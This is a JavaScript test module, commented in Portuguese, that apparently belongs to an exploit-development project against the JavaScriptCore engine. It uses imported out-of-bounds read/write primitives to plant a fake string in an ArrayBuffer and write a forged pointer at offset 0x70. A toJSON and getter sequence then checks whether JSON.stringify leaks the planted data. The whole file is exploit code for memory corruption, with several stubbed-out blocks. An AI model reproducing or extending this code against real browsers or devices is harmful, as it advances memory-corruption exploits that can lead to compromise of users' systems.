// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, stringToAdvancedInt64Array, advancedInt64ArrayToString } from '../utils.mjs'; // Assumindo que utils tem helpers de string
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForStringPoison";
let getter_called_flag = false;
let current_test_results = {
    success: false, message: "Teste não iniciado.", error: null,
    details: "", stringify_output_getter: null
};

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70

// Onde plantaremos nossa string falsa e o ponteiro para ela
const FAKE_STRING_DATA_OFFSET = 0x100; // Onde a string "LEAKED..." será escrita
const FAKE_STRING_POINTER_VAL = new AdvancedInt64(FAKE_STRING_DATA_OFFSET, 0); // O valor a ser escrito em 0x70, representando o offset
const ACTUAL_FAKE_STRING = "====TARGET_STRING_LEAKED_SUCCESSFULLY====";

class CheckpointForStringPoison {
    constructor(id) {
        this.id_marker = `StringPoisonChkpt-${id}`;
        // Esta propriedade será serializada. Se o Stringifier usar um ponteiro corrompido (de 0x70)
        // para obter o valor desta propriedade, ele pode ler nossa FAKE_STRING.
        this.property_to_be_poisoned = "OriginalValue_ABC"; 
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "StringPoison_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = {
            success: false, message: "Getter chamado, verificando output de stringify.",
            error: null, details: "", stringify_output_getter: null
        };
        let details_log = [];

        try {
            if (!oob_array_buffer_real || !oob_read_absolute) {
                throw new Error("oob_array_buffer_real ou oob_read_absolute não disponíveis.");
            }
            
            // O JSON.stringify externo já foi acionado.
            // Vamos tentar stringify 'this' novamente DENTRO do getter para ver seu estado.
            logS3("DENTRO DO GETTER: Chamando JSON.stringify(this) para análise...", "info", FNAME_GETTER);
            let internal_json_str = "";
            try {
                // Para evitar recursão infinita se o toJSON deste objeto chamar o getter de novo,
                // podemos remover temporariamente o getter ou usar um objeto diferente.
                // Ou, mais simples, stringify uma propriedade específica.
                // Stringify o objeto 'this' inteiro (que é CheckpointForStringPoison)
                // Sua propriedade 'property_to_be_poisoned' será serializada.
                internal_json_str = JSON.stringify(this);
                current_test_results.stringify_output_getter = internal_json_str;
                details_log.push(`JSON.stringify(this) no getter retornou: ${internal_json_str.substring(0, 200)}...`);
                logS3(`Stringify(this) no getter output (parcial): ${internal_json_str.substring(0,100)}...`, "info", FNAME_GETTER);

                if (internal_json_str.includes(ACTUAL_FAKE_STRING)) {
                    current_test_results.success = true;
                    current_test_results.message = "SUCESSO! String Falsa VAZADA no output do JSON.stringify interno!";
                    logS3(current_test_results.message, "vuln", FNAME_GETTER);
                } else {
                    current_test_results.message = "String falsa não encontrada no output do stringify interno.";
                }

            } catch (e_int_json) {
                details_log.push(`Erro no stringify interno: ${e_int_json.message}`);
                logS3(`Erro no stringify interno: ${e_int_json.message}`, "error", FNAME_GETTER);
                current_test_results.error = `Erro stringify interno: ${e_int_json.message}`;
            }
            current_test_results.details = details_log.join('; ');

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        return { "getter_processed_string_poison_test": true }; // Getter precisa retornar algo
    }

    // O método toJSON é crucial para controlar como JSON.stringify processa este objeto
    // e para acionar o getter.
    toJSON() {
        const FNAME_toJSON = "CheckpointForStringPoison.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        
        // Acionar o getter. O valor de retorno do getter não é diretamente usado por este toJSON.
        // eslint-disable-next-line no-unused-vars
        const DUMMY_READ_GETTER = this[GETTER_CHECKPOINT_PROPERTY_NAME]; 
        
        // O que este toJSON retorna é o que JSON.stringify usará.
        // Para o teste, queremos que ele tente serializar a propriedade que pode ser envenenada.
        return {
            id: this.id_marker,
            poisoned_prop_value: this.property_to_be_poisoned, // Importante!
            processed_by_poison_test_toJSON: true
        };
    }
}

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "executeStringPoisonTestRunner";
    logS3(`--- Iniciando Teste de Envenenamento de String do Stringifier ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* Reset inicial */ };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // 1. Plantar a STRING FALSA no oob_array_buffer_real
        const strBytes = stringToAdvancedInt64Array(ACTUAL_FAKE_STRING); // Precisa de uma função para converter string para array de AdvancedInt64/bytes
        let current_string_offset = FAKE_STRING_DATA_OFFSET;
        for (const adv64 of strBytes) {
            oob_write_absolute(current_string_offset, adv64, 8); // Assumindo que stringToAdvancedInt64Array retorna partes de 8 bytes
            current_string_offset += 8;
        }
        // Adicionar um terminador nulo duplo (UTF-16) se o Stringifier esperar isso, ou apenas um terminador nulo simples.
        // Para JS, um Uint16Array terminaria com 0. Para C-string, um byte 0.
        // Vamos assumir que o Stringifier lê até um terminador nulo ou usa um length.
        // Se for um JSString*, ele tem seu próprio length.
        // Para simplificar, vamos apenas plantar a string. O Stringifier pode ler além.
        logS3(`String falsa "${ACTUAL_FAKE_STRING}" plantada em oob_data[${toHex(FAKE_STRING_DATA_OFFSET)}]`, "info", FNAME_TEST_RUNNER);

        // 2. Escrita OOB Gatilho: Escrever o PONTEIRO (offset) para a string falsa em 0x70
        // Hipótese: 0x70 é usado pelo Stringifier como um ponteiro para dados de string.
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, FAKE_STRING_POINTER_VAL, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} com PONTEIRO FALSO ${FAKE_STRING_POINTER_VAL.toString(true)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForStringPoison(1);
        logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        let final_json_output = "";
        try {
            final_json_output = JSON.stringify(checkpoint_obj);
            logS3(`JSON.stringify EXTERNO completado. Resultado: ${final_json_output.substring(0,300)}...`, "info", FNAME_TEST_RUNNER);
            current_test_results.details = (current_test_results.details || "") + `Output JSON Externo (parcial): ${final_json_output.substring(0,100)}`;

            // Verificar se a string falsa apareceu no output do JSON.stringify EXTERNO
            if (final_json_output.includes(ACTUAL_FAKE_STRING)) {
                current_test_results.success = true;
                current_test_results.message = "SUCESSO! String Falsa VAZADA no output do JSON.stringify EXTERNO!";
                logS3(current_test_results.message, "vuln", FNAME_TEST_RUNNER);
            } else if (getter_called_flag && !current_test_results.success) { // Se o getter foi chamado mas não houve leak no output externo
                current_test_results.message = current_test_results.message || ""; // Preserve msg do getter
                current_test_results.message += " String falsa não encontrada no output do stringify EXTERNO, mas getter foi chamado.";
            }


        } catch (e_json_ext) { 
            logS3(`Erro em JSON.stringify (externo): ${e_json_ext.message}`, "error", FNAME_TEST_RUNNER);
             if(current_test_results) { 
                current_test_results.error = (current_test_results.error || "") + ` ErrExtJS:${e_json_ext.message}`;
            }
        }

    } catch (mainError_runner) { /* ... */ }
    finally { /* ... */ }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE STRING POISON: SUCESSO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE STRING POISON: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da tentativa: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
        }
         if (current_test_results.error) { /* ... */ }
    } else {
        logS3("RESULTADO TESTE STRING POISON: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
    }

    clearOOBEnvironment();
    logS3(`--- Teste de Envenenamento de String do Stringifier Concluído ---`, "test", FNAME_TEST_RUNNER);
}
